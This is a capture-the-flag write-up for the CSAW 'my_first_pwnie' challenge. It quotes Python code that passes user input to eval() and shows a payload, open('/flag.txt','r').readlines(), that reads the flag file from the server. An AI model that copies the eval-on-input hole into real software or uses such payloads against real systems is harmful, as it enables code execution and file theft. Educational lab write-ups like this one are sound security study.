# my_first_pwnie

---
## Challenge
```
You must be this 👉 high to ride.

Note: flag is in /flag.txt

Author: ElykDeer

Connect with:
nc intro.csaw.io 31137 
```

[my_first_pwnie.py](../_resources/my_first_pwnie-1.py)

---
## Code Analysis
``` 
try:
  response = eval(input("What's the password? "))
  print(f"You entered `{response}`")
  if response == "password":
    print("Yay! Correct! Congrats!")
    quit()
except:
  pass

print("Nay, that's not it.")
```
This code shows the main part that we must exploit to be able to read ```/flag``` to complete the challenge. It looks like that our user input is passed to the ```eval``` function. This means that our input will be interpreted as a python expression and the output will be placed in the ```response``` variable. This means that we can execute arbitrary code then have the result written back to us by the print statement later on.

---

---
## Exploitation
Lets input some python expressions to the server and see what happens.
```
What's the password? 4+4
You entered `8`
Nay, that's not it.
```
Nice it looks like our input is being passed as python code and the output is printed back to us. Now lets try to read the ```/flag.txt``` file
```
What's the password? open('/flag.txt','r').readlines()
You entered `['csawctf{neigh______}\n']`
Nay, that's not it.
```
Nice we opened and read the file with our arbitrary python code execution !

---